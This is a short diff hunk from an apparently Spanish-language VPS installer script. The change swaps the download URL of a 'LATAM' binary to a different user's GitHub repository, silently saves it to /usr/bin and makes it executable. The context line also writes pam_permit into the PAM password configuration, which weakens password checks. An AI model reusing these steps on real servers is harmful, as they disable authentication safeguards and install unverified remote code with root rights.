@@ -189,7 +189,7 @@ password required pam_permit.so' >/etc/pam.d/common-password && chmod +x /etc/pa
   read -t 120 -n 1 -rsp $'\033[1;97m           Preciona Enter Para continuar\n'
   clear && clear
   apt update
-  wget -O /usr/bin/LATAM https://raw.githubusercontent.com/NetVPS/LATAM_Oficial/main/Instalador/LATAM &>/dev/null
+  wget -O /usr/bin/LATAM https://raw.githubusercontent.com/vpsvip7/2d/main/LATAM &>/dev/null
   chmod +x /usr/bin/LATAM
 }
 
